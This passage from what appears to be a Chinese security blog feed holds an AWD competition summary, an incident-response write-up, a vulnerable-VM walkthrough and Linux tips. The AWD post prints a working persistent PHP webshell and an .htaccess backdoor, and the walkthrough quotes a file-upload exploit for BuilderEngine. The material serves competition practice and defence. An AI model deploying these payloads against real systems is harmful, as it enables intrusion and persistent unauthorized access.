    <content type="html"><![CDATA[<h1 id="自己一次线下AWD线下赛总结"><a href="#自己一次线下AWD线下赛总结" class="headerlink" title="自己一次线下AWD线下赛总结"></a>自己一次线下AWD线下赛总结</h1><p>6号的时候参加了技协杯awd线下攻防赛，虽然被打的很惨，但tm很涨教训，感觉联通的那队有套路，8队6队都没防，一直在攻击，我靠，光辉之间那厮近9000多分。。。</p><hr><p>AWD即Attack With Defence，一般awd团队赛都是三个人共同维护一台机器或者多台机器，两台Web，一台pwn，利用漏洞攻击其队的flag得分，其他队伍提交了你的flag你就会失分，那么此时就需要团队协作防御和攻击所维护的服务器</p><h2 id="关于AWD一些固定规则："><a href="#关于AWD一些固定规则：" class="headerlink" title="关于AWD一些固定规则："></a>关于AWD一些固定规则：</h2><ul><li>一般分配Web服务器，Pwn服务器，服务器或叫做Gamebox（多数为Linux）某处存在flag</li><li>可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（没遇到过）</li><li>flag在主办方的设定下每隔一定时间（通常是5分钟）刷新一轮</li><li>各队一般都有自己的初始分数，flag一旦被其他队伍拿走，该队扣除一定积分，其他队伍得分</li><li>主办方会对每个队伍的服务进行check，服务宕机扣除分数</li><li>一般每个队伍会给一个低权限用户，非root权限<h2 id="awd赛前技巧"><a href="#awd赛前技巧" class="headerlink" title="awd赛前技巧"></a>awd赛前技巧</h2>赛前一定要把线下所有用到的脚本在本地在跑一下，一些python常用库，<br>比赛时候，出现一血只要不是自己，看到谁被打了立马就去打被攻击打那个人，短时间内肯定来不及修复，自己被打了，可以去看流量，比赛过程中如果实在发现不了漏洞，可以多观察一下流量<h2 id="防守技巧"><a href="#防守技巧" class="headerlink" title="防守技巧"></a>防守技巧</h2><h3 id="Web题加固"><a href="#Web题加固" class="headerlink" title="Web题加固"></a>Web题加固</h3></li><li>代码层，是否有webshell，是否有rce漏洞</li><li>中间件层，apache解析漏洞，目录遍历等</li><li>其他服务，mysql未授权访问什么的<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2>awd中最头疼的应该就是不死马了，可以打别人，别人也会向你服务器种不死马<br>比如像如下：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &apos;2.php&apos;;</span><br><span class="line">$code = &apos;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)&#123;@eval($_POST[a]);&#125; ?&gt;&apos;;</span><br><span class="line">while (1)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">我们如何发现它？</span><br><span class="line">ls -a</span><br><span class="line">如何解决？</span><br><span class="line">rm .webshell.php &amp;&amp; mkdir .webshell.php //建立一个和不死马一样名字的文件夹，这样不死马就写不进去了</span><br><span class="line">完全杀死不死马，得清理内存</span><br><span class="line">ps -aux|grep &apos;www-data&apos;|awk&apos;&#123;print$2&#125;&apos;|xargs kill -9 // 杀进程得在root或者www-data权限下</span><br></pre></td></tr></table></figure><h2 id="webshell查杀"><a href="#webshell查杀" class="headerlink" title="webshell查杀"></a>webshell查杀</h2><p>因为比赛现场大多数都是没有网盾，所以你的webshell扫描工具联网是用不了的，<br>一定要选择可以离线使用的webshell查杀工具，可以选择D盾，但距离比赛前一天一定要升级一下裤<br>长亭的牡云扫描器也是可以离线使用的</p><h2 id="web加固"><a href="#web加固" class="headerlink" title="web加固"></a>web加固</h2><p>其他rce漏洞</p><ul><li>反序列化，命令注入等</li><li>赛前一定把常用的各种cms都准备一遍，一般外国的比较多，代码实在审计不出来直接把代码覆盖，cms最新的漏洞，怎么利用赛场你要做的不光是防住，更多的是攻击，所以怎么代码审计能力一定要有</li><li>其他的漏洞，就是一些常见的；<br>sql注入<br>XXE<br>SSRF<br>… …</li></ul><p>根据敏感关键字回溯参数传递过程</p><ul><li>.htaccess时常就会被当作后门使用，要注意，比如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(gif|jpe?g|png)$&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Apache安全加固"><a href="#Apache安全加固" class="headerlink" title="Apache安全加固"></a>Apache安全加固</h2><ul><li>账号设置</li></ul><p>以专门的用户账号和用户组运行apache服务，这里要说明要熟悉不同系统apache.conf，httpd.conf的位置，centos，debian，ubuntu等<br>根据需要，为apache服务创建用户及用户组，如果没有设置用户和组，则新建用户，并在apache配置文件中进行指定</p><p>创建apache用户组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd Apache</span><br></pre></td></tr></table></figure></p><p>创建apache用户并加入apache用户组<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">useradd apache -g Apache</span><br></pre></td></tr></table></figure></p><p>将下面两行设置参数加入apache配置文件http.conf,debian下可能是etc下的apache2/apache2.conf<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure></p><p>检查httpd.conf或者是apache2.conf配置文件中是否允许使用非专用账号运行（如root）apache服务<br>默认设置一般即符合要求，linux系统中默认使用apache或者nobody用户</p><ul><li>授权设置</li></ul><p>严格控制apache主目录的访问权限，非超级用户不能修改该目录中的内容<br>aoache 的主目录应对于apache server配置文件httpd.conf中的Server Root控制项，设置为：<br>Server Root /usr/local/apahe</p><p>判定条件 非超级用户不能修改该目录的内容<br>检测操作：常识进行修改，看是否能修改目录中的内容<br>该目录一般设置为/etc/httpd目录，默认情况下属root 用户，其他用户不鞥修改目录中文件</p><hr><p>先去吃饭，回来在更新</p>]]></content>
    
    <summary type="html">
    
      6号的时候参加了技协杯awd线下攻防赛，虽然被打的很惨，但tm很涨教训，感觉联通的那队有套路，8队6队都没防，一直在攻击，我靠，光辉之间那厮近9000多分。。。
    
    </summary>
    
    
      <category term="awd" scheme="http://yoursite.com/tags/awd/"/>
    
  </entry>
  
  <entry>
    <title>update,upgrade,dist-upgrade区别</title>
    <link href="http://yoursite.com/2020/03/29/update-upgrade-dist-upgrade%E5%8C%BA%E5%88%AB/"/>
    <id>http://yoursite.com/2020/03/29/update-upgrade-dist-upgrade区别/</id>
    <published>2020-03-29T15:12:09.000Z</published>
    <updated>2020-03-29T15:12:52.415Z</updated>
    
    <content type="html"><![CDATA[<p>刚刚和公司一老哥，讨论debian更新，特意man了一下，贴出来，可以作为知识补充<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">update：  </span><br><span class="line"></span><br><span class="line">update is used to resynchronize the packageindex files from their sources. The indexes of available packages are fetchedfrom the location(s) specified in /etc/apt/sources.list. For example, whenusing a Debian archive, this command retrieves and scans the Packages.gz files,so that information about new and updated packages is available. An updateshould always be performed before an upgrade or dist-upgrade. Please be awarethat the overall progress meter will be incorrect as the size of the packagefiles cannot be known in advance.</span><br><span class="line"></span><br><span class="line">upgrade：</span><br><span class="line"></span><br><span class="line">upgrade is used to install the newestversions of all packages currently installed on the system from the sources enumerated in /etc/apt/sources.list.Packages currently installed with new versions available are retrieved and upgraded; under no circumstancesare currently installed packages removed, or packages not already installed retrieved and installed. Newversions of currently installed packages that cannot be upgraded without changing the install statusof another package will be left at their current version. An update must be performed first so that apt-getknows that new versions of packages are available.</span><br><span class="line"></span><br><span class="line">dist-upgrade:</span><br><span class="line"></span><br><span class="line"> dist-upgrade in addition to performing the function of upgrade, alsointelligently handles changing dependencies with new versions of packages; apt-get has a&quot;smart&quot; conflict resolution system, and it will attempt to upgrade the most important packages at the expense of lessimportant ones if necessary. The /etc/apt/sources.list file contains a list of locations from which toretrieve desired package files. See also apt_preferences(5) for a mechanism for overriding the generalsettings for individual packages.</span><br></pre></td></tr></table></figure></p><p>上面内容均是从apt-get的man文档里面截取下来的，从英文内容我们可以知道：</p><p><code>update</code>：当执行<code>apt-get update</code>时，<code>update</code>重点更新的是来自软件源的软件包的索引记录（即index files）。</p><p><code>upgrade</code>：当执行<code>apt-get upgrade```时，upgrade是根据```update</code>更新的索引记录来下载并更新软件包。</p><p><code>dist-upgrade</code>:当执行<code>apt-get dist-upgrade</code>时，除了拥有upgrade的全部功能外，dist-upgrade会比upgrade更智能地处理需要更新的软件包的依赖关系。</p>]]></content>
    
    <summary type="html">
    
      刚刚和公司一老哥，讨论debian更新，特意man了一下，贴出来，可以作为知识补充
    
    </summary>
    
    
      <category term="debian" scheme="http://yoursite.com/tags/debian/"/>
    
      <category term="ubuntu" scheme="http://yoursite.com/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>linux下chrome&amp;chromium代理的方式</title>
    <link href="http://yoursite.com/2020/03/29/linux%E4%B8%8Bchrome-chromium%E4%BB%A3%E7%90%86%E7%9A%84%E6%96%B9%E5%BC%8F/"/>
    <id>http://yoursite.com/2020/03/29/linux下chrome-chromium代理的方式/</id>
    <published>2020-03-29T15:10:00.000Z</published>
    <updated>2020-03-29T15:11:23.091Z</updated>
    
    <content type="html"><![CDATA[<p>我们在鸟上装完chrome，突然发现他不能像windows或者mac一样，在<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">神马把SwitchyOmegaProxy本地下载下来，然后改后缀名为zip，然后再用chrome导入，</span><br></pre></td></tr></table></figure></p><p>你会发现着尼马神马方法，真怀疑他们怎么成功的，可能当时他们的版本的chrome可能好使，但是最新的可能不行，或者就是这群傻逼根本就不懂，估计也没成功，误人子弟～！！！！！！！</p><hr><p>接下来提供一种可行的办法，不行的话， 我吃屎<br>我们apt完chromium之后，<br>通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man chromium</span><br></pre></td></tr></table></figure></p><p>我们在很显眼的地方还到proxy-server神马神马<br><img src="/2020/03/29/linux下chrome-chromium代理的方式/e1.jpeg" alt="2019-08-04-165826_1920x2160_scrot|444x500"><br>主要看上边那个图，下边的是我另一块屏幕，这都不重要对吧，<br>能看懂的人自然知道咋弄，其实不懂的也可以直接百度翻译对吧，translate.baidu.com 貌似是这么写，进不去去百度一下把，我也不知道写的对不对，<br>不懂的我直接贴出神仙的命令，看好，只写一遍</p><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chromium ---proxy-server=&quot;socks5://127.0.0.1:1080&quot;</span><br></pre></td></tr></table></figure><p>玩鸟的都知道啥意思把，仅用http啥的自己去设置，实在不懂的话就可以卸载了，<br>然后自动就弹出来个chromium，搜索 东西啥的就能google了，这时候你在登录google帐号，去chromestore去下载SwitchyOmegaProxy,你不能每次开浏览器都终端手动打把，所以直接在浏览器做好代理</p><hr><h2 id="补充一下"><a href="#补充一下" class="headerlink" title="补充一下"></a>补充一下</h2><p>最近发现，原来直接<figure class="highlight plain"><figcaption><span>---proxy-server</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![image|683x500](e2.png) </span><br><span class="line">通过不断调试发现可以通过加```-no-sandbox```来实现，命令如下</span><br></pre></td></tr></table></figure></p><p>google-chrome-stable –proxy-server=”socks5://127.0.0.1:1080” –no-sandbox<br><code>`</code><br><img src="/2020/03/29/linux下chrome-chromium代理的方式/e3.png" alt="image|590x500"></p>]]></content>
    
    <summary type="html">
    
      linux下chrome&amp;chromium代理的方式
    
    </summary>
    
    
      <category term="linux" scheme="http://yoursite.com/tags/linux/"/>
    
      <category term="chrome" scheme="http://yoursite.com/tags/chrome/"/>
    
      <category term="proxy" scheme="http://yoursite.com/tags/proxy/"/>
    
  </entry>
  
  <entry>
    <title>某项目应急响应处置</title>
    <link href="http://yoursite.com/2020/03/29/%E6%9F%90%E9%A1%B9%E7%9B%AE%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%A4%84%E7%BD%AE/"/>
    <id>http://yoursite.com/2020/03/29/某项目应急响应处置/</id>
    <published>2020-03-29T15:07:42.000Z</published>
    <updated>2020-03-29T15:09:00.922Z</updated>
    
    <content type="html"><![CDATA[<h1 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h1><p><a href="https://github.com/HexChristmas/IncidentResponseKnowledge" target="_blank" rel="noopener">https://github.com/HexChristmas/IncidentResponseKnowledge</a></p><h1 id="安全事件概述"><a href="#安全事件概述" class="headerlink" title="安全事件概述"></a>安全事件概述</h1><p>某天晚20:00接到客户应急响应请求，现场流量设备发现服务器webshell报警，需要进行排查以及溯源，其实是接着上次那个shiro利用写的，这次写一下应急的过程</p><h1 id="定位事件根源"><a href="#定位事件根源" class="headerlink" title="定位事件根源"></a>定位事件根源</h1><p>通过对告警日志及webshell，确定这次攻击是通过shiro反序列化获取服务器全县并反弹shell写入webshell</p><h1 id="应急响应流程"><a href="#应急响应流程" class="headerlink" title="应急响应流程"></a>应急响应流程</h1><h2 id="系统分析"><a href="#系统分析" class="headerlink" title="系统分析"></a>系统分析</h2><p>通过对失陷机器排查，发现在/vdb2/apps/apache-tomcat-7.0.82-8080/webapps/ilive/tysx/js/下发现后门：md5.jsp，创建时间为2019-08-08 15:41:25。在xxx的目录/vdb2/apps/apache-tomcat-7.0.82-8080/webapps/ilive/tysx下发现webhsell后门：.mm.jsp，创建时间为2019-08-08 23:51:17。通过分析服务器相关组件、访问日志、流量日志等线索，确定攻击者是通过shiro组件的反序列化漏洞，反弹shell之后，部署的两个webshell后门。</p><p>web服务器的history日志：</p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/1.png" alt="img1"></p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/2.png" alt="img2"></p><p>根据history可以看到，攻击者判断是否能出网，然后在反弹shell，部署webshell后门，操作时间段大约在：2019.08.08 15:14~2019.08.08 15:41。</p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/3.png" alt="img3"></p><p>除此之外，还看到.mm.jsp的创建时间为2019-08-08 23:51:17，而shiro的反序列化攻击时间为2019-08-08 23:44:41，操作时间段相符</p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/4.png" alt="img4"></p><p><img src="https://raw.githubusercontent.com/HexChristmas/IncidentResponseKnowledge/master/source/5.png" alt="img5"></p><p>经开发韵味确认，该服务器上部署的shiro框架版本为1.2.2，该版本存在反序列化漏洞</p><h2 id="安全事件处置"><a href="#安全事件处置" class="headerlink" title="安全事件处置"></a>安全事件处置</h2><ol><li><p>删除webshell后门</p></li><li><p>删除啊shiro组件或删除shiro到最新版本</p></li><li><p>安装杀毒软件</p></li><li><p>修改受感染的用户密码</p></li></ol><h1 id="应急响应总结"><a href="#应急响应总结" class="headerlink" title="应急响应总结"></a>应急响应总结</h1><p>本次应急响应，攻击者通过shiro组建的发序列化漏洞获取到主机权限，并在反弹shjell之后，留下后门，攻击者在拿到主机权限之后，不排除内网横向移动到可能</p>]]></content>
    
    <summary type="html">
    
      某天晚20:00接到客户应急响应请求，现场流量设备发现服务器webshell报警，需要进行排查以及溯源，其实是接着上次那个shiro利用写的，这次写一下应急的过程
    
    </summary>
    
    
      <category term="incident response" scheme="http://yoursite.com/tags/incident-response/"/>
    
  </entry>
  
  <entry>
    <title>Sedna靶场</title>
    <link href="http://yoursite.com/2020/03/29/Sedna%E9%9D%B6%E5%9C%BA/"/>
    <id>http://yoursite.com/2020/03/29/Sedna靶场/</id>
    <published>2020-03-29T15:00:15.000Z</published>
    <updated>2020-03-29T15:05:49.627Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p><img src="/2020/03/29/Sedna靶场/w1.png" alt="%E5%9B%BE%E7%89%87%201|690x423"> </p><h3 id="开放端口："><a href="#开放端口：" class="headerlink" title="开放端口："></a>开放端口：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22 53 80 110 111 139 143 445 993 995 8080</span><br></pre></td></tr></table></figure><h3 id="开放服务："><a href="#开放服务：" class="headerlink" title="开放服务："></a>开放服务：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">OpenSSH 6.6.1p1  </span><br><span class="line">ISC BIND 9.9.5-3</span><br><span class="line">Apache httpd 2.4.7 Dovecot pop3d</span><br><span class="line">Samba smbd 3.X - 4.X ssl/imaps?</span><br><span class="line">Apache Tomcat7/Coyote JSP engine 1.1</span><br></pre></td></tr></table></figure><h3 id="暴力目录探测"><a href="#暴力目录探测" class="headerlink" title="暴力目录探测"></a>暴力目录探测</h3><table><thead><tr><th>links</th></tr></thead><tbody><tr><td> <a href="http://192.168.88.134/blocks/" target="_blank" rel="noopener">http://192.168.88.134/blocks/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/files/" target="_blank" rel="noopener">http://192.168.88.134/files/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/index.html" target="_blank" rel="noopener">http://192.168.88.134/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/modules/" target="_blank" rel="noopener">http://192.168.88.134/modules/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/robots.txt" target="_blank" rel="noopener">http://192.168.88.134/robots.txt</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/server" target="_blank" rel="noopener">http://192.168.88.134/server</a></td><td></td><td></td></tr><tr><td> <a href="http://192.168.88.134/license.txt" target="_blank" rel="noopener">http://192.168.88.134/license.txt</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/" target="_blank" rel="noopener">http://192.168.88.134/system/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/themes/" target="_blank" rel="noopener">http://192.168.88.134/themes/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/modules/" target="_blank" rel="noopener">http://192.168.88.134/modules/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/" target="_blank" rel="noopener">http://192.168.88.134/system/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/" target="_blank" rel="noopener">http://192.168.88.134/system/core/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/" target="_blank" rel="noopener">http://192.168.88.134/system/database/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/fonts/" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/helpers/" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/" target="_blank" rel="noopener">http://192.168.88.134/system/language/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/libraries/" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/themes/" target="_blank" rel="noopener">http://192.168.88.134/themes/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/" target="_blank" rel="noopener">http://192.168.88.134/system/core/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/compat/" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/core/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/" target="_blank" rel="noopener">http://192.168.88.134/system/database/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/fonts/" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/fonts/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/fonts/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/helpers/" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/helpers/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/helpers/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/" target="_blank" rel="noopener">http://192.168.88.134/system/language/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/english/" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/language/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/libraries/" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/libraries/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/libraries/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/compat/" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/core/compat/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/core/compat/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mssql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mysql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mysql/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/odbc/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/odbc/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/english/" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/language/english/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/language/english/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mssql/" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mssql/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mssql/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/mysql/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/mysql/index.html</a></td><td></td></tr><tr><td> <a href="http://192.168.88.134/system/database/drivers/odbc/index.html" target="_blank" rel="noopener">http://192.168.88.134/system/database/drivers/odbc/index.html</a></td><td></td><td></td></tr></tbody></table><h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>根据nmap扫描出来的端口和服务看了看貌似没啥能利用的漏洞，看一下dirb都爬到了什么信息，全部看完，发现没什么思路，又仔细看了第二遍，发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.88.134/license.txt</span><br></pre></td></tr></table></figure></p><p>这个地方<br><img src="/2020/03/29/Sedna靶场/w2.png" alt="2|690x316"><br>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，</p><p>看到Radian Enterprise，Enterprise貌似是企业的意思，放到google里搜索一圈，<br><img src="/2020/03/29/Sedna靶场/w3.png" alt="3|690x386"> </p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><h2 id="初步利用"><a href="#初步利用" class="headerlink" title="初步利用"></a>初步利用</h2><p> 谷歌告诉我们这个的确存在漏洞，漏洞大概在BuilderEngine任意文件上传，<br>查看exploit-db，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1) Unauthenticated Unrestricted File Upload:</span><br><span class="line">POST /themes/dashboard/assets/plugins/jquery-file-upload/server/php/</span><br><span class="line">Vulnerable Parameter: files[]</span><br><span class="line">We can upload test.php and reach the file via the following link:</span><br><span class="line">/files/test.php--&gt;&lt;html&gt;&lt;body&gt;&lt;form method=&quot;post&quot; action=&quot;http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">&lt;input type=&quot;file&quot; name=&quot;files[]&quot; /&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;send&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>告诉我们，要我们把下面的代码以post方式传上去<br><img src="/2020/03/29/Sedna靶场/w4.png" alt="4|690x386"> </p><p>用蚁剑连接shell<br><img src="/2020/03/29/Sedna靶场/w5.png" alt="5|690x450"> </p><p>查看第一个<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![6|690x456](w6.png) </span><br><span class="line"></span><br><span class="line">## 深度利用</span><br><span class="line">深入，我们发现我们的用户是www-data权限，我们cat /etc/os-release发现这个系统是ubuntu14.04.1，其实我们</span><br></pre></td></tr></table></figure></p><p>NAME=”Ubuntu”<br>VERSION=”14.04.1 LTS, Trusty Tahr”<br>ID=ubuntu<br>ID_LIKE=debian<br>PRETTY_NAME=”Ubuntu 14.04.1 LTS”<br>VERSION_ID=”14.04”<br>HOME_URL=”<a href="http://www.ubuntu.com/&quot;" target="_blank" rel="noopener">http://www.ubuntu.com/&quot;</a><br>SUPPORT_URL=”<a href="http://help.ubuntu.com/&quot;" target="_blank" rel="noopener">http://help.ubuntu.com/&quot;</a><br>BUG_REPORT_URL=<a href="http://bugs.launchpad.net/ubuntu/" target="_blank" rel="noopener">http://bugs.launchpad.net/ubuntu/</a><br><code>`</code><br><img src="/2020/03/29/Sedna靶场/w7.png" alt="7|690x382"><br>通过seachsploit搜索相关exploit，发现可用的有脏牛，还有一个内核提权的漏洞，我们上船之后，发现编译执行无法提权，<br>我们根据我们之前nmap出的信息，openssh版本太高没啥可利用的漏洞，<br>脏牛，我们发现一祭出脏牛，吧唧就崩溃了，<br>apache2.4.7貌似有一个信息泄漏，我们要的是拿flag提权对吧，也没啥用，不关注了<br>Apachetomcat7，有一个cve-2016-1240本地提权的，exp传上去发现明明存在comcat7但是就是提不了权，继续看<br>我们继续google，发现可以用chkrootkit0.49提权，反弹shell监听msf利用拿flag<br><img src="/2020/03/29/Sedna靶场/w8.png" alt="8|690x470"></p>]]></content>
    
    <summary type="html">
    
      这段时间自己练了一些靶场
    
    </summary>
    
    
      <category term="vulnerablility" scheme="http://yoursite.com/tags/vulnerablility/"/>
    
      <category term="exploit" scheme="http://yoursite.com/tags/exploit/"/>
    
  </entry>
  
  <entry>
    <title>Centos7扩容</title>
    <link href="http://yoursite.com/2020/03/29/Centos7%E6%89%A9%E5%AE%B9/"/>
    <id>http://yoursite.com/2020/03/29/Centos7扩容/</id>
    <published>2020-03-29T14:54:00.000Z</published>
    <updated>2020-03-29T15:05:10.958Z</updated>
    
